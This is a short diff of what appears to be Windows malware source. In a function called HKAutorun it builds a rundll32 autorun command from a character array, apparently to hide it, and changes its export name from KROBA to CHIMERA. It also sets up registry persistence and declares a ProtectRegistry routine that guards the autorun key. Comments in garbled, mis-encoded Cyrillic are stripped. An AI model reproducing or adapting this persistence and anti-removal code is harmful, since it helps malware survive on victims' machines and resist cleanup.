@@ -103,7 +103,7 @@ BOOL HKAutorun(LPWSTR pSelf)
 
 	WCHAR wsprintfString[] =
 	{
-		L'r', L'u', L'n', L'd', L'l', L'l', L'3', L'2', L'.', L'e', L'x', L'e', L' ', L'\"', L'%', L's', L'\"', L',', L'K', L'R', L'O', L'B', L'A', L'\0'
+		L'r', L'u', L'n', L'd', L'l', L'l', L'3', L'2', L'.', L'e', L'x', L'e', L' ', L'\"', L'%', L's', L'\"', L',', L'C', L'H', L'I', L'M', L'E', L'R', L'A', L'\0'
 	};
 
 	wsprintfW(pRunCommandLine, wsprintfString, pSelf);
@@ -140,8 +140,7 @@ BOOL HKAutorun(LPWSTR pSelf)
 		{
 			bRet = TRUE;
 
-			SetupPersistence(szRandomString, bHKLM, pSelf); // âðóáèòü ïåðñèñòåíñ, ñì. îïèñàíèå îêîëî ñàìîé ôóíêöèè
-
+			SetupPersistence(szRandomString, bHKLM, pSelf); 
 		}
 		RegCloseKey(hKey);
 	}
@@ -154,9 +153,9 @@ BOOL HKAutorun(LPWSTR pSelf)
 
 struct PersistenceInformation
 {
-	WCHAR pKeyName[256]; // èìÿ êëþ÷à
+	WCHAR pKeyName[256]; 
 	WCHAR pSelf[256];
-	BOOL bHKLM; // çàùèùàòü HKLM èëè íåò ( HKCU )
+	BOOL bHKLM; 
 };
 
 DWORD WINAPI ProtectRegistry(PersistenceInformation *lpPersistence)
